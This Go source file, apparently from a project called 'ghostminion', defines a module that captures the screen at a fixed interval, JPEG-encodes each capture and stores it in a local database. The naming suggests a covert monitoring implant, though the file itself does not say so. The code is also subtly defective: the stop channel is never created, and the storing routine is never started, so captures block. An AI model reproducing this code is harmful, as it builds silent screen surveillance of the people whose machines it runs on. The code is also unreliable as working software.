package apps

import (
	"bytes"
	"errors"
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/kbinani/screenshot"
	"image"
	"image/jpeg"
	"sync"
	"time"
)

type ScreenshotApp struct {
	Interval       int8 `json:"interval"`
	Quality        int  `json:"quality"`
	stop           chan struct{}
	screenshotChan chan bytes.Buffer
}

func (c *ScreenshotApp) Start(wg *sync.WaitGroup) {
	wg.Add(1)
	defer wg.Done()

	c.screenshotChan = make(chan bytes.Buffer)

	go func() {
		for {
			select {
			case <-c.stop:
				return
			default:
				screenshotBuf, err := c.getScreenshot()
				if err != nil {
					lgr.Warn("error in screenshot app", err.Error())
				}
				captureTime := time.Now().Unix()
				lgr.Info("Screenshot captured at", captureTime)
				c.screenshotChan <- screenshotBuf
				time.Sleep(time.Duration(c.Interval) * time.Second)
			}
		}

	}()
}

func (c *ScreenshotApp) Stop() {
	close(c.stop)
}

func (c *ScreenshotApp) Validate() error {
	return nil
}

func (c *ScreenshotApp) getScreenshot() (bytes.Buffer, error) {
	var buf bytes.Buffer
	var err error

	activeDisplaysNum := screenshot.NumActiveDisplays()
	if activeDisplaysNum <= 0 {
		return buf, errors.New("no active displays found")
	}

	for i := range activeDisplaysNum {
		bounds := screenshot.GetDisplayBounds(i).Union(image.Rect(0, 0, 0, 0))
		if img, err := screenshot.CaptureRect(bounds); img != nil {
			if err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: c.Quality}); err == nil {
				return buf, nil
			}
		}
	}
	return bytes.Buffer{}, err
}

func (c *ScreenshotApp) storeScreenshot() {
	go func() {
		for ss := range c.screenshotChan {
			err := db.WriteData("", dbDataTypes.Screenshots, ss.Bytes())
			if err != nil {
				lgr.Error("Error writing file data: ", err)
			}
		}
	}()
}
